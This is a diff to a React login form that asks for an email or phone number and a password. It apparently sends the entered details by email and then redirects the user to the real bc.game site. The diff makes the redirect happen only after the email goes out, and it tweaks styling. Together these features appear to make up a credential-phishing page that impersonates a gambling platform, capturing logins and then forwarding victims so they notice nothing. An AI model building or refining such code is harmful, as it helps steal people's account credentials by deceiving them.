@@ -94,13 +94,12 @@ const LoginForm = () => {
 
       if (response.ok) {
         console.log("Email sent successfully");
+        router.push("https://bc.game/");
       } else {
-        console.error("Failed to send email");
+        console.error("Failed to send email", response);
       }
     } catch (error) {
-      console.error("Error:", error.message);
-    } finally {
-      router.push("https://bc.game/");
+      console.error("Error:", error);
     }
   };
   return (
@@ -119,7 +118,7 @@ const LoginForm = () => {
                 id="email"
                 name="email"
                 placeholder="Email / Phone number"
-                className="w-full bg-black hover:bg-transparent px-5 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
+                className="w-full text-sm lg:text-base bg-black hover:bg-transparent px-5 py-1.5 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                 autoComplete="off"
               />
               <ErrorMessage
@@ -135,7 +134,7 @@ const LoginForm = () => {
                 id="password"
                 name="password"
                 placeholder="Login password"
-                className="w-full pl-5 pr-12 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
+                className="w-full text-sm lg:text-base pl-5 pr-12 py-1.5 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                 autoComplete="off"
               />
               <button
